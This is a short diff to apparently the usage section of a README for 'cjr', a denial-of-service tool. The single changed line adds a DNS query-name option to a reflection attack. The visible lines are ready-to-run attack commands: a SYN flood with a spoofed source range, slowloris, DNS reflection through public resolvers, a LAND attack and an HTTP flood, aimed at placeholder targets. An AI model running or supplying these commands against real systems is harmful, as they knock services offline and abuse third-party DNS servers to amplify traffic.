@@ -26,7 +26,7 @@ cjr -m syn-flood -s 192.168.2.0/24 -d 192.168.1.3 -p 80 -r 100/s
 cjr -m slowloris --url http://www.example.com --request GET -c 100 -r 1/s --timeout 10
 cjr -m slowloris -u http://www.example.com -X POST -c 100 -r 10/s -t 20
 cjr -m rdns --target 192.168.1.3 --dns 202.120.224.6:53 --dns 61.129.42.6:53 --dns 114.114.114.114:53 -c 1000 -r 10/s
-cjr -m rdns --target 192.168.1.3 -f dns_servers.txt -c 1000 -r 10/s
+cjr -m rdns --target 192.168.1.3 -f dns_servers.txt -c 1000 -r 10/s --question www.example.com
 cjr -m land -d 192.168.1.3 -p 80 -r 10/s
 cjr -m http-flood -u http://www.example.com -X POST -c 100 -r 10/s
 ```
